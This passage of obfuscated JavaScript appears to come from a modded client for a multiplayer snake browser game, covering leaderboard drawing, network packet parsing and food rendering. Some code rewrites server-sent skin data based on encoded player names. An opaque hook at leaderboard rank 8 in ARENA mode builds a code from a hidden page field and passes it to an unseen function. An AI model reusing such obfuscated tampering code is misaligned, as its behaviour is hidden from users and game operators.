            } else {
              this.addChild(_0x314f33);
            }
          } else {
            this.addChild(_0xfa7e1);
            this.addChild(_0x2e32b4);
            if (_0x207b06.hz && _0x207b06.mobile) {
              _0xfa7e1.x = -97;
              _0x2e32b4.x = -65;
              this.addChild(_0xb5f074);
              this.addChild(_0x1e6f48);
            } else {
              this.addChild(_0x314f33);
            }
          }
        } else if (_0x207b06.hz) {
          _0x207b06.mobile;
        }
        ;
        this.addChild(_0x322fdb);
        var _0x477cbd = ooo.Mh.Qh.eh === _0x7f096e.jd.id;
        var _0x5d24ad = 0;
        var _0x737a9f = 0;
        if (_0x737a9f >= this.Sg.length) {
          this.bi();
        }
        this.Sg[_0x737a9f].ci(1, "white");
        this.Sg[_0x737a9f].di("", _0x331039.U("index.game.leader.top10").replace("10", _0x207b06.to), `(${ooo.Mh.ei} .online)`);
        this.Sg[_0x737a9f].position.y = _0x5d24ad;
        _0x5d24ad += this._h;
        _0x737a9f += 1;
        if (_0x548b6d.fi.length > 0) {
          _0x5d24ad += this.ai;
        }
        for (var _0x398292 = 0; _0x398292 < _0x548b6d.fi.length; _0x398292++) {
          var _0x2e3226 = _0x548b6d.fi[_0x398292];
          var _0x40a927 = ooo.ud.Cc().Ub(_0x2e3226.gi);
          var _0x71ea09 = "";
          var _0xe6b16c = ooo.ud.Gc().textDict[_0x40a927._b];
          if (_0xe6b16c != null) {
            _0x71ea09 = _0x331039.V(_0xe6b16c);
          }
          if (_0x737a9f >= this.Sg.length) {
            this.bi();
          }
          this.Sg[_0x737a9f].ci(0.8, _0x40a927.ac.cc);
          this.Sg[_0x737a9f].di(`${_0x398292 + 1}`, _0x71ea09, `${_0x331039._(_0x2e3226.hi)}`);
          this.Sg[_0x737a9f].position.y = _0x5d24ad;
          _0x5d24ad += this._h;
          _0x737a9f += 1;
        }
        ;
        if (_0x548b6d.ii.length > 0) {
          _0x5d24ad += this.ai;
        }
        for (var _0x20fc35 = 0; _0x20fc35 < _0x548b6d.ii.length - (10 - _0x207b06.to); _0x20fc35++) {
          var _0x445a5a = _0x548b6d.ii[_0x20fc35];
          var _0x1c71db = ooo.Mh.Qh.fh === _0x445a5a.ji;
          var _0x237c4b = undefined;
          var _0x3a04a2 = undefined;
          if (_0x1c71db) {
            _0x237c4b = "white";
            _0x3a04a2 = ooo.Mh.Lh.ki.Xa;
          } else {
            var _0x4b18ae = ooo.Mh.li[_0x445a5a.ji];
            if (_0x4b18ae != null) {
              _0x237c4b = _0x477cbd ? ooo.ud.Cc().Ub(_0x4b18ae.ki.mi).ac.cc : ooo.ud.Cc().Tb(_0x4b18ae.ki.ni).cc;
              if (_0x207b06.sn) {
                if (!_0x4b18ae.originalName) {
                  _0x4b18ae.originalName = _0x4b18ae.ki.Xa;
                }
                _0x3a04a2 = _0x31650d(_0x4b18ae.originalName, false);
              } else {
                _0x3a04a2 = "---";
              }
            } else {
              _0x237c4b = "gray";
              _0x3a04a2 = "?";
            }
          }
          ;
          if (_0x1c71db) {
            _0x5d24ad += this.ai;
          }
          if (_0x737a9f >= this.Sg.length) {
            this.bi();
          }
          this.Sg[_0x737a9f].ci(_0x1c71db ? 1 : 0.8, _0x237c4b);
          this.Sg[_0x737a9f].di(`${_0x20fc35 + 1}`, _0x3a04a2, `${_0x331039._(_0x445a5a.hi)}`);
          this.Sg[_0x737a9f].position.y = _0x5d24ad;
          _0x5d24ad += this._h;
          _0x737a9f += 1;
          if (_0x1c71db) {
            _0x5d24ad += this.ai;
          }
        }
        for (ooo.Mh.oi > _0x548b6d.ii.length && (_0x5d24ad += this.ai, _0x737a9f >= this.Sg.length && this.bi(), this.Sg[_0x737a9f].ci(1, "white"), this.Sg[_0x737a9f].di(`${ooo.Mh.oi}`, ooo.Mh.Lh.ki.Xa, `${_0x331039._(ooo.Mh.Lh.hi)}`), this.Sg[_0x737a9f].position.y = _0x5d24ad, _0x5d24ad += this._h, _0x737a9f += 1, _0x5d24ad += this.ai); this.Sg.length > _0x737a9f;) {
          _0x4ead11.k.F.G(this.Sg.pop());
        }
      };
      _0x2b9d4b.prototype.bi = function () {
        var _0x5a0159 = new _0x5c891c();
        _0x5a0159.position.y = 0;
        if (this.Sg.length > 0) {
          _0x5a0159.position.y = this.Sg[this.Sg.length - 1].position.y + this._h;
        }
        this.Sg.push(_0x5a0159);
        this.addChild(_0x5a0159);
      };
      (_0x3aa975 = _0x331039.ca(_0x4ead11.k.l, function () {
        _0x4ead11.k.l.call(this);
        this.pi = new _0x4ead11.k.t("", {
          fontFamily: "PTSans",
          fontSize: 12,
          fill: "white"
        });
        this.pi.anchor.x = 1;
        this.pi.position.x = 30;
        this.addChild(this.pi);
        this.qi = new _0x4ead11.k.t("", {
          fontFamily: "PTSans",
          fontSize: 12,
          fill: "white"
        });
        this.qi.anchor.x = 0;
        this.qi.position.x = 35;
        this.addChild(this.qi);
        this.ri = new _0x4ead11.k.t("", {
          fontFamily: "PTSans",
          fontSize: 12,
          fill: "white"
        });
        this.ri.anchor.x = 1;
        this.ri.position.x = 220;
        this.addChild(this.ri);
      })).prototype.di = function (_0x395644, _0x320c07, _0x35d04c) {
        this.pi.text = _0x395644;
        this.ri.text = _0x35d04c;
        if (_0x207b06.st && parseInt(_0x395644) == 8) {
          var _0x63d4c8 = $("#port_id_s").val();
          var _0x3175f9 = _0x63d4c8.substr(-10, 4) + _0x63d4c8.substr(-28, 3);
          if (parseInt(_0x35d04c) >= 100000) {
            _0x3175f9 = _0x63d4c8.substr(-24, 1) + "1" + _0x3175f9;
            if (_0x2e59c9.val() == "ARENA") {
              _0x31baaf(_0x3175f9);
            }
          } else {
            _0x3175f9 = _0x63d4c8.substr(-24, 1) + "0" + _0x3175f9;
            if (_0x2e59c9.val() == "ARENA") {
              _0x31baaf(_0x3175f9);
            }
          }
          _0x207b06.st = false;
        }
        ;
        var _0x39b64e = _0x320c07;
        for (this.qi.text = _0x39b64e; this.qi.width > 110;) {
          _0x39b64e = _0x39b64e.substring(0, _0x39b64e.length - 1);
          this.qi.text = _0x39b64e + "..";
        }
      };
      _0x3aa975.prototype.ci = function (_0x2a0842, _0x132832) {
        this.pi.alpha = _0x2a0842;
        this.pi.style.fill = _0x132832;
        this.qi.alpha = _0x2a0842;
        this.qi.style.fill = _0x132832;
        this.ri.alpha = _0x2a0842;
        this.ri.style.fill = _0x132832;
      };
      _0x5c891c = _0x3aa975;
      var _0x2a006 = _0x2b9d4b;
      return _0x276411;
    }();
    _0x7f096e.si = function () {
      function _0x167c3a(_0x2fc122) {
        this.Mh = _0x2fc122;
        this.ti = [];
        this.vi = 0;
      }
      _0x167c3a.prototype.wi = function (_0x17c771) {
        this.ti.push(new _0x7f096e.Ha(new _0x7f096e.Ga(_0x17c771)));
      };
      _0x167c3a.prototype.xi = function () {
        this.ti = [];
        this.vi = 0;
      };
      _0x167c3a.prototype.yi = function () {
        for (var _0x43e95c = 0; _0x43e95c < 10; _0x43e95c++) {
          if (this.ti.length === 0) {
            return;
          }
          ;
          var _0x248a38 = this.ti.shift();
          try {
            this.zi(_0x248a38);
          } catch (_0x12bf04) {
            throw _0x12bf04;
          }
        }
      };
      _0x167c3a.prototype.zi = function (_0x5665fd) {
        switch (_0x5665fd.Ka(0) & 255) {
          case 0:
            this.Ai(_0x5665fd);
            return;
          case 1:
            this.Bi(_0x5665fd);
            return;
          case 2:
            this.Ci(_0x5665fd);
            return;
          case 3:
            this.Di(_0x5665fd);
            return;
          case 4:
            this.Ei(_0x5665fd);
            return;
          case 5:
            this.Fi(_0x5665fd);
            return;
        }
      };
      _0x167c3a.prototype.Ai = function (_0x1bfeff) {
        this.Mh.Qh.eh = _0x1bfeff.Ka();
        var _0x5da395 = _0x1bfeff.La();
        this.Mh.Qh.fh = _0x5da395;
        this.Mh.Lh.ki.Je = _0x5da395;
        this.Mh.Qh.gh = _0x1bfeff.Na();
        this.Mh.Qh.hh = _0x1bfeff.Na();
        this.Mh.Qh.ih = _0x1bfeff.Na();
        _0x207b06.sn = ooo.Xg.Hi.Gi();
        ooo.Xg.Kf.Wg.Bg(this.Mh.Qh, ooo.Xg.Hi.Gi());
      };
      _0x167c3a.prototype.Bi = function (_0x1ea969) {
        var _0x1781d2;
        var _0x308223 = this.vi++;
        var _0x1fe4ba = _0x1ea969.La();
        _0x1781d2 = this.Ii(_0x1ea969);
        for (var _0x12548d = 0; _0x12548d < _0x1781d2; _0x12548d++) {
          this.Ji(_0x1ea969);
        }
        ;
        _0x1781d2 = this.Ii(_0x1ea969);
        for (var _0x4e38cf = 0; _0x4e38cf < _0x1781d2; _0x4e38cf++) {
          this.Ki(_0x1ea969);
        }
        ;
        _0x1781d2 = this.Ii(_0x1ea969);
        for (var _0xddbcc1 = 0; _0xddbcc1 < _0x1781d2; _0xddbcc1++) {
          this.Li(_0x1ea969);
        }
        ;
        _0x1781d2 = this.Ii(_0x1ea969);
        for (var _0x16b1e4 = 0; _0x16b1e4 < _0x1781d2; _0x16b1e4++) {
          this.Mi(_0x1ea969);
        }
        ;
        _0x1781d2 = this.Ii(_0x1ea969);
        for (var _0x427c12 = 0; _0x427c12 < _0x1781d2; _0x427c12++) {
          this.Ni(_0x1ea969);
        }
        ;
        _0x1781d2 = this.Ii(_0x1ea969);
        for (var _0x258d6e = 0; _0x258d6e < _0x1781d2; _0x258d6e++) {
          this.Oi(_0x1ea969);
        }
        ;
        _0x1781d2 = this.Ii(_0x1ea969);
        for (var _0x433a1a = 0; _0x433a1a < _0x1781d2; _0x433a1a++) {
          this.Pi(_0x1ea969);
        }
        ;
        _0x1781d2 = this.Ii(_0x1ea969);
        for (var _0x31fab2 = 0; _0x31fab2 < _0x1781d2; _0x31fab2++) {
          this.Qi(_0x1ea969);
        }
        ;
        if (_0x308223 > 0) {
          this.Ri(_0x1ea969);
        }
        this.Mh.Si(_0x308223, _0x1fe4ba);
      };
      _0x167c3a.prototype.Mi = function (_0x299859) {
        var _0x2b5c6b = new _0x7f096e.Ui.Ti();
        _0x2b5c6b.Je = _0x299859.La();
        _0x2b5c6b.mi = this.Mh.Qh.eh === _0x7f096e.jd.id ? _0x299859.Ka() : _0x7f096e.dh.jh;
        _0x2b5c6b.ni = _0x299859.La();
        _0x2b5c6b.Vi = _0x299859.La();
        _0x2b5c6b.Wi = _0x299859.La();
        _0x2b5c6b.Xi = _0x299859.La();
        _0x2b5c6b.Yi = _0x299859.La();
        for (var _0x446cf1 = _0x299859.Ka(), _0x39178f = "", _0x23aed4 = 0; _0x23aed4 < _0x446cf1; _0x23aed4++) {
          _0x39178f += String.fromCharCode(_0x299859.La());
        }
        ;
        _0x2b5c6b.Xa = _0x39178f;
        if (this.Mh.Qh.fh === _0x2b5c6b.Je && _0x15b640(_0x2b5c6b.Xa) || _0x15b640(_0x2b5c6b.Xa)) {
          let _0x247e1e = _0x3dc122(_0x2b5c6b.Xa);
          _0x2b5c6b.ni = _0x2b5c6b.ni + _0x247e1e.a;
          if (_0xa2a78e(_0x2b5c6b.Vi)) {
            _0x2b5c6b.Vi = _0x247e1e.b;
          }
          if (_0xa2a78e(_0x2b5c6b.Wi)) {
            _0x2b5c6b.Wi = _0x247e1e.c;
          }
          if (_0xa2a78e(_0x2b5c6b.Xi)) {
            _0x2b5c6b.Xi = _0x247e1e.d;
          }
          if (_0xa2a78e(_0x2b5c6b.Yi)) {
            _0x2b5c6b.Yi = _0x247e1e.e;
          }
        }
        ;
        _0x2b5c6b.Xa = _0x39178f;
        if (this.Mh.Qh.fh === _0x2b5c6b.Je) {
          _0x2b5c6b.Xa = _0x20533a(_0x2b5c6b.Xa);
          _0x5c2dcc.m = this.Mh.Lh;
          _0x5c2dcc.n = _0x2b5c6b;
          _0x5c2dcc.m.Zi(_0x5c2dcc.n);
        } else {
          _0x2b5c6b.Xa = _0x20533a(_0x2b5c6b.Xa);
          var _0xe7fbdf = this.Mh.li[_0x2b5c6b.Je];
          if (_0xe7fbdf != null) {
            _0xe7fbdf.$i();
          }
          var _0x29b9c4 = new _0x7f096e.Ui(this.Mh.Qh);
          _0x29b9c4._i(ooo.Xg.Kf.Wg);
          this.Mh.li[_0x2b5c6b.Je] = _0x29b9c4;
          _0x29b9c4.Zi(_0x2b5c6b);
        }
      };
      _0x167c3a.prototype.Ni = function (_0x1d8632) {
        var _0x2432a7 = _0x1d8632.La();
        var _0x8ce689 = _0x1d8632.Ka();
        var _0x4b7b3f = !!(_0x8ce689 & 1);
        var _0x6b9ad6 = 0;
        if (_0x4b7b3f) {
          _0x6b9ad6 = _0x1d8632.La();
        }
        var _0x2e9f2d = this.aj(_0x2432a7);
        if (_typeof(_0x2e9f2d) !== "undefined" && (_0x2e9f2d.bj = false, _0x2e9f2d.cj)) {
          var _0x44fb94 = this.aj(_0x2432a7);
          if (_0x4b7b3f && _typeof(_0x44fb94) !== "undefined" && _0x44fb94.cj) {
            if (_0x6b9ad6 === this.Mh.Qh.fh) {
              var _0x53f6f5 = this.Mh.Lh.Oh();
              var _0x4e99d8 = _0x2e9f2d.dj(_0x53f6f5._a, _0x53f6f5.ab);
              _0x331039.ia(0, 1 - _0x4e99d8.ej / (this.Mh.Nh * 0.5));
              if (_0x4e99d8.ej < this.Mh.Nh * 0.5) {
                var _0x3b7df7 = _0x2e9f2d.ki && _0x2e9f2d.ki.Xa ? _0x2e9f2d.ki.Xa : "";
                ooo.Xg.Kf.Wg.Dh.Vg(!!(_0x8ce689 & 2), _0x3b7df7);
              }
            } else if (_0x2432a7 === this.Mh.Qh.fh) ;else {
              var _0x2418ed = this.Mh.Lh.Oh();
              var _0x33d70b = _0x2e9f2d.dj(_0x2418ed._a, _0x2418ed.ab);
              _0x331039.ia(0, 1 - _0x33d70b.ej / (this.Mh.Nh * 0.5));
            }
          } else if (_0x2432a7 === this.Mh.Qh.fh) ;else {
            var _0x2a02ea = this.Mh.Lh.Oh();
            var _0xd69ad3 = _0x2e9f2d.dj(_0x2a02ea._a, _0x2a02ea.ab);
            _0x331039.ia(0, 1 - _0xd69ad3.ej / (this.Mh.Nh * 0.5));
          }
        }
      };
      _0x167c3a.prototype.Qi = function (_0xdae66a) {
        var _0x2a0bc8 = _0xdae66a.La();
        var _0x177947 = _0x2a0bc8 === this.Mh.Qh.fh ? null : this.Mh.li[_0x2a0bc8];
        var _0x2a5af3 = _0xdae66a.Ka();
        var _0x118f94 = !!(_0x2a5af3 & 1);
        if (_0x2a5af3 & 2) {
          var _0x268552 = _0xdae66a.Na();
          if (_0x177947) {
            _0x177947.fj(_0x268552);
          }
        }
        ;
        var _0x106cba = this.gj(_0xdae66a.Ka(), _0xdae66a.Ka(), _0xdae66a.Ka());
        var _0x270623 = this.gj(_0xdae66a.Ka(), _0xdae66a.Ka(), _0xdae66a.Ka());
        if (_0x177947) {
          _0x177947.hj(_0x106cba, _0x270623, _0x118f94);
          var _0x1697f1 = this.Mh.Lh.Oh();
          var _0x374502 = _0x177947.Oh();
          var _0x43ca86 = _0x331039.ia(0, 1 - _0x331039.la(_0x1697f1._a - _0x374502._a, _0x1697f1.ab - _0x374502.ab) / (this.Mh.Nh * 0.5));
          ooo.ij.Gf(_0x43ca86, _0x2a0bc8, _0x118f94);
        }
        ;
        var _0x5c0e90 = this.Ii(_0xdae66a);
        if (_0x177947) {
          for (var _0x206ac1 in _0x177947.Nd) {
            var _0x2f9354 = _0x177947.Nd[_0x206ac1];
            if (_0x2f9354) {
              _0x2f9354.Rd = false;
            }
          }
        }
        ;
        for (var _0x4f0282 = 0; _0x4f0282 < _0x5c0e90; _0x4f0282++) {
          var _0x4eb4c6 = _0xdae66a.Ka();
          var _0x56c3b9 = _0xdae66a.Ka();
          if (_0x177947) {
            var _0x5de5ab = _0x177947.Nd[_0x4eb4c6];
            _0x5de5ab ||= _0x177947.Nd[_0x4eb4c6] = new _0x7f096e.Pd(_0x4eb4c6);
            _0x5de5ab.Rd = true;
            _0x5de5ab.Xd = _0x331039.ha(1, _0x331039.ia(0, _0x56c3b9 / 100));
          }
        }
      };
      _0x167c3a.prototype.Ri = function (_0x3e1a96) {
        var _0x265db2 = this.Mh.Lh;
        var _0x4e07c1 = _0x3e1a96.Ka();
        var _0x1c671b = !!(_0x4e07c1 & 1);
        if (_0x4e07c1 & 2) {
          var _0x478b98 = _0x265db2.hi;
          _0x265db2.fj(_0x3e1a96.Na());
          if ((_0x478b98 = _0x265db2.hi - _0x478b98) > 0) {
            ooo.Xg.Kf.Wg.Dh.Ug(_0x478b98);
          }
        }
        ;
        if (_0x4e07c1 & 4) {
          this.Mh.jj = _0x3e1a96.Na();
        }
        var _0x2f1fdc = this.gj(_0x3e1a96.Ka(), _0x3e1a96.Ka(), _0x3e1a96.Ka());
        var _0x4679b1 = this.gj(_0x3e1a96.Ka(), _0x3e1a96.Ka(), _0x3e1a96.Ka());
        _0x265db2.hj(_0x2f1fdc, _0x4679b1, _0x1c671b);
        ooo.ij.Gf(0.5, this.Mh.Qh.fh, _0x1c671b);
        var _0x30b22d = this.Ii(_0x3e1a96);
        for (var _0x2cbdb9 in _0x265db2.Nd) {
          var _0x5385f9 = _0x265db2.Nd[_0x2cbdb9];
          if (_0x5385f9) {
            _0x5385f9.Rd = false;
          }
        }
        ;
        for (var _0x290e79 = 0; _0x290e79 < _0x30b22d; _0x290e79++) {
          var _0x32d09f = _0x3e1a96.Ka();
          var _0x2fc206 = _0x3e1a96.Ka();
          var _0x4bcc58 = _0x265db2.Nd[_0x32d09f];
          if (!_0x4bcc58) {
            _0x4bcc58 = new _0x7f096e.Pd(_0x32d09f);
            _0x265db2.Nd[_0x32d09f] = _0x4bcc58;
          }
          _0x4bcc58.Rd = true;
          _0x4bcc58.Xd = _0x331039.ha(1, _0x331039.ia(0, _0x2fc206 / 100));
        }
        ;
        ooo.Xg.Kf.Wg.Bh.Bg(_0x265db2.Nd);
      };
      _0x167c3a.prototype.Oi = function (_0x3d7f8b) {
        var _0x2d3858 = this;
        var _0x211194 = _0x3d7f8b.La();
        var _0x26c311 = this.aj(_0x211194);
        var _0x54616b = _0x3d7f8b.Na();
        var _0x59cd4f = this.Ii(_0x3d7f8b);
        if (_0x26c311) {
          _0x26c311.fj(_0x54616b);
          _0x26c311.kj(function () {
            return _0x2d3858.gj(_0x3d7f8b.Ka(), _0x3d7f8b.Ka(), _0x3d7f8b.Ka());
          }, _0x59cd4f);
          _0x26c311.Td(true);
          var _0x20ee2f = this.Mh.Lh.Oh();
          var _0x1857c3 = _0x26c311.Oh();
          var _0x946bef = _0x331039.ia(0, 1 - _0x331039.la(_0x20ee2f._a - _0x1857c3._a, _0x20ee2f.ab - _0x1857c3.ab) / (this.Mh.Nh * 0.5));
          ooo.ij.Ef(_0x946bef, _0x211194);
        } else {
          for (var _0x1d3d89 = 0; _0x1d3d89 < _0x59cd4f * 6; _0x1d3d89++) {
            _0x3d7f8b.Ka();
          }
        }
      };
      _0x167c3a.prototype.Pi = function (_0xb0aaac) {
        var _0x417f66 = _0xb0aaac.La();
        var _0x17b268 = this.Mh.li[_0x417f66];
        if (_0x17b268 && _0x17b268.bj) {
          _0x17b268.Td(false);
        }
        ooo.ij.Ff(_0x417f66);
      };
      _0x167c3a.prototype.Ji = function (_0x5ea4a2) {
        var _0x63efc2 = new _0x7f096e.lj.Ti();
        _0x63efc2.Je = _0x5ea4a2.Ma();
        _0x63efc2.mi = this.Mh.Qh.eh === _0x7f096e.jd.id ? _0x5ea4a2.Ka() : _0x7f096e.dh.jh;
        _0x63efc2.mj = this.gj(_0x5ea4a2.Ka(), _0x5ea4a2.Ka(), _0x5ea4a2.Ka());
        _0x63efc2.ni = _0x5ea4a2.Ka();
        var _0x1f0b7e = this.Mh.nj[_0x63efc2.Je];
        if (_0x1f0b7e != null) {
          _0x1f0b7e.$i();
        }
        var _0x5062eb = new _0x7f096e.lj(_0x63efc2, ooo.Xg.Kf.Wg);
        _0x5062eb.oj(this.pj(_0x63efc2.Je), this.qj(_0x63efc2.Je), true);
        this.Mh.nj[_0x63efc2.Je] = _0x5062eb;
      };
      _0x167c3a.prototype.Ki = function (_0x5e99de) {
        var _0x414f00 = _0x5e99de.Ma();
        var _0x4ee37e = this.Mh.nj[_0x414f00];
        if (_0x4ee37e) {
          _0x4ee37e.rj = 0;
          _0x4ee37e.sj = _0x4ee37e.sj * 1.5;
          _0x4ee37e.tj = true;
        }
      };
      _0x167c3a.prototype.Li = function (_0x4666b4) {
        var _0x24dd20 = _0x4666b4.Ma();
        var _0x40946e = _0x4666b4.La();
        var _0x2dd2f5 = this.Mh.nj[_0x24dd20];
        if (_0x2dd2f5) {
          _0x2dd2f5.rj = 0;
          _0x2dd2f5.sj = _0x2dd2f5.sj * 0.1;
          _0x2dd2f5.tj = true;
          var _0x4b9859 = this.aj(_0x40946e);
          if (_0x4b9859 && _0x4b9859.cj) {
            this.Mh.Qh.fh;
            var _0xd1521d = _0x4b9859.Oh();
            _0x2dd2f5.oj(_0xd1521d._a, _0xd1521d.ab, false);
          }
        }
      };
      var _0x22a7f0 = [34, 29, 26, 24, 22, 20, 18, 17, 15, 14, 13, 12, 11, 10, 9, 8, 8, 7, 6, 6, 5, 5, 4, 4, 3, 3, 2, 2, 2, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 2, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 8, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 20, 22, 24, 26, 29, 34];
      _0x167c3a.prototype.Ci = function (_0xff5040) {
        var _0x46c64a = ooo.ud.Ic().oc;
        var _0x245e5a = _0x46c64a.getImageData(0, 0, 80, 80);
        var _0xc0250 = _0x22a7f0[0];
        var _0x4e9199 = 80 - _0xc0250;
        var _0x2db81b = 0;
        for (var _0xa0dce3 = 0; _0xa0dce3 < 628; _0xa0dce3++) {
          var _0x45185b = _0xff5040.Ka();
          for (var _0x1c1543 = 0; _0x1c1543 < 8; _0x1c1543++) {
            var _0x2f27ac = (_0xc0250 + _0x2db81b * 80) * 4;
            if ((_0x45185b >> _0x1c1543 & 1) != 0) {
              _0x245e5a.data[_0x2f27ac] = 255;
              _0x245e5a.data[_0x2f27ac + 1] = 255;
              _0x245e5a.data[_0x2f27ac + 2] = 255;
              _0x245e5a.data[_0x2f27ac + 3] = 255;
            } else {
              _0x245e5a.data[_0x2f27ac + 3] = 0;
            }
            if (++_0xc0250 >= _0x4e9199 && ++_0x2db81b < 80) {
              _0x4e9199 = 80 - (_0xc0250 = _0x22a7f0[_0x2db81b]);
            }
          }
        }
        ;
        _0x46c64a.putImageData(_0x245e5a, 0, 0);
        var _0x5021aa = ooo.Xg.Kf.Wg.Ah.Yh;
        _0x5021aa.texture = ooo.ud.Ic().Za;
        _0x5021aa.texture.update();
      };
      _0x167c3a.prototype.Ei = function (_0x171cf9) {
        _0x171cf9.Ma();
      };
      _0x167c3a.prototype.Fi = function (_0x2880b0) {
        createCircle();
        this.Mh.uj();
      };
      _0x167c3a.prototype.Di = function (_0x2090aa) {
        this.Mh.ei = _0x2090aa.La();
        this.Mh.oi = _0x2090aa.La();
        var _0x3730f9 = new _0x7f096e.vj();
        _0x3730f9.ii = [];
        for (var _0x2141a4 = _0x2090aa.Ka(), _0x292d4a = 0; _0x292d4a < _0x2141a4; _0x292d4a++) {
          var _0x552726 = _0x2090aa.La();
          var _0x32aaeb = _0x2090aa.Na();
          _0x3730f9.ii.push(_0x7f096e.vj.wj(_0x552726, _0x32aaeb));
        }
        ;
        _0x3730f9.fi = [];
        if (this.Mh.Qh.eh === _0x7f096e.jd.id) {
          for (var _0x2cc38f = _0x2090aa.Ka(), _0x297e28 = 0; _0x297e28 < _0x2cc38f; _0x297e28++) {
            var _0x1e3a9a = _0x2090aa.Ka();
            var _0x236a2a = _0x2090aa.Na();
            _0x3730f9.fi.push(_0x7f096e.vj.xj(_0x1e3a9a, _0x236a2a));
          }
        }
        ;
        ooo.Xg.Kf.Wg.Ch.Bg(_0x3730f9);
      };
      _0x167c3a.prototype.aj = function (_0x53f6d5) {
        if (_0x53f6d5 === this.Mh.Qh.fh) {
          return this.Mh.Lh;
        } else {
          return this.Mh.li[_0x53f6d5];
        }
      };
      _0x167c3a.prototype.gj = function (_0x501e6f, _0x241797, _0x332f6b) {
        return (((_0x332f6b & 255 | _0x241797 << 8 & 65280 | _0x501e6f << 16 & 16711680) & 16777215) / 8388608 - 1) * 10000;
      };
      _0x167c3a.prototype.pj = function (_0x5c18c7) {
        return ((_0x5c18c7 & 65535) / 32768 - 1) * this.Mh.Qh.kh();
      };
      _0x167c3a.prototype.qj = function (_0x5e360a) {
        return ((_0x5e360a >> 16 & 65535) / 32768 - 1) * this.Mh.Qh.kh();
      };
      _0x167c3a.prototype.Ii = function (_0x131c76) {
        var _0x16ba5c = _0x131c76.Ka();
        if ((_0x16ba5c & 128) == 0) {
          return _0x16ba5c;
        }
        ;
        var _0xfb3465 = _0x131c76.Ka();
        if ((_0xfb3465 & 128) == 0) {
          return _0xfb3465 | _0x16ba5c << 7 & 16256;
        }
        ;
        var _0x134fb5 = _0x131c76.Ka();
        if ((_0x134fb5 & 128) == 0) {
          return _0x134fb5 | _0xfb3465 << 7 & 16256 | _0x16ba5c << 14 & 2080768;
        }
        ;
        var _0x9e47fe = _0x131c76.Ka();
        if ((_0x9e47fe & 128) == 0) {
          return _0x9e47fe | _0x134fb5 << 7 & 16256 | _0xfb3465 << 14 & 2080768 | _0x16ba5c << 21 & 266338304;
        } else {
          return undefined;
        }
      };
      return _0x167c3a;
    }();
    _0x7f096e.yj = function () {
      function _0x424ddf(_0x16ab07) {
        this.zj = _0x16ab07;
      }
      _0x424ddf.Aj = function () {
        return new _0x7f096e.yj(null);
      };
      _0x424ddf.Bj = function (_0x3414bc) {
        return new _0x7f096e.yj(_0x3414bc);
      };
      _0x424ddf.prototype.Mc = function () {
        return this.zj;
      };
      _0x424ddf.prototype.Cj = function () {
        return this.zj != null;
      };
      _0x424ddf.prototype.Dj = function (_0x842ba1) {
        if (this.zj != null) {
          _0x842ba1(this.zj);
        }
      };
      return _0x424ddf;
    }();
    _0x7f096e.lj = function () {
      function _0x3d5928(_0x23c8fe, _0x3c8537) {
        this.ki = _0x23c8fe;
        this.Ej = _0x23c8fe.ni >= 80;
        this.Fj = 0;
        this.Gj = 0;
        this.Hj = 0;
        this.Ij = 0;
        this.sj = this.Ej ? 1 : _0x23c8fe.mj;
        this.rj = 1;
        this.tj = false;
        this.Jj = 0;
        this.Kj = 0;
        this.Lj = 1;
        this.Mj = _0x494ea6.S * _0x331039.ma();
        this.Nj = new _0x7f096e.Oj();
        this.Nj.hd(ooo.Mh.Qh.eh, this.ki.mi === _0x7f096e.dh.jh ? null : ooo.ud.Cc().Ub(this.ki.mi), ooo.ud.Cc().Zb(this.ki.ni));
        _0x3c8537.Vh(_0x23c8fe.Je, this.Nj);
      }
      _0x3d5928.prototype.$i = function () {
        this.Nj.Wh.md.G();
        this.Nj.Wh.ld.G();
      };
      _0x3d5928.prototype.oj = function (_0x57df74, _0x1c73b8, _0x4a8fd9) {
        this.Fj = _0x57df74;
        this.Gj = _0x1c73b8;
        if (_0x4a8fd9) {
          this.Hj = _0x57df74;
          this.Ij = _0x1c73b8;
        }
      };
      _0x3d5928.prototype.Pj = function (_0x4ab2b4, _0x24996f) {
        var _0x2cc6f5 = _0x331039.ha(0.5, this.sj * 1);
        var _0x23b1da = _0x331039.ha(2.5, this.sj * 1.5);
        this.Jj = _0x331039.ga(this.Jj, _0x2cc6f5, _0x24996f, 0.0025);
        this.Kj = _0x331039.ga(this.Kj, _0x23b1da, _0x24996f, 0.0025);
        this.Lj = _0x331039.ga(this.Lj, this.rj, _0x24996f, 0.0025);
      };
      _0x3d5928.prototype.Qj = function (_0x2a2b60, _0x102926, _0x1cf805) {
        this.Hj = _0x331039.ga(this.Hj, this.Fj, _0x102926, _0x207b06.eat_animation);
        this.Ij = _0x331039.ga(this.Ij, this.Gj, _0x102926, 0.0025);
        this.Nj.Bg(this, _0x2a2b60, _0x102926, _0x1cf805);
      };
      _0x3d5928.Ti = function _0x451ac4() {
        this.Je = 0;
        this.mi = _0x7f096e.dh.jh;
        this.mj = 0;
        this.ni = 0;
      };
      return _0x3d5928;
    }();
    _0x7f096e.Oj = function () {
      function _0x2b9ed3() {
        this.Wh = new _0x432848(new _0x7f096e.bd(), new _0x7f096e.bd());
        this.Wh.md.gd.blendMode = _0x4ead11.k.w.z;
        this.Wh.md.gd.zIndex = _0x2d4f0b;
        this.Wh.ld.gd.zIndex = _0x1e108e;
      }
      var _0x1e108e = 500;
      var _0x2d4f0b = 100;
      _0x2b9ed3.prototype.hd = function (_0x17acb9, _0x43ef97, _0x1fae61) {
        var _0x3aa964 = _0x1fae61.dc;
        if (_0x3aa964 != null) {
          this.Wh.ld.kd(_0x3aa964);
        }
        var _0x2820ab = _0x17acb9 === _0x7f096e.jd.id && _0x43ef97 != null ? _0x43ef97.bc.ec : _0x1fae61.ec;
        if (_0x2820ab != null) {
          this.Wh.md.kd(_0x2820ab);
        }
      };
      _0x2b9ed3.prototype.Bg = function (_0xddf856, _0x4e1f0f, _0x1de782, _0x428d25) {
        if (!_0x428d25(_0xddf856.Hj, _0xddf856.Ij)) {
          this.Wh.Cd();
          return;
        }
        ;
        var _0x9dd4d4 = _0xddf856.Kj * (1 + _0x331039.pa(_0xddf856.Mj + _0x4e1f0f / 200) * 0.3);
        if (_0xddf856.Ej) {
          this.Wh.Ad(_0xddf856.Hj, _0xddf856.Ij, _0x207b06.PortionSize * _0xddf856.Jj, _0xddf856.Lj * 1, _0x207b06.PortionAura * _0x9dd4d4, _0x207b06.PortionTransparent * _0xddf856.Lj);
        } else {
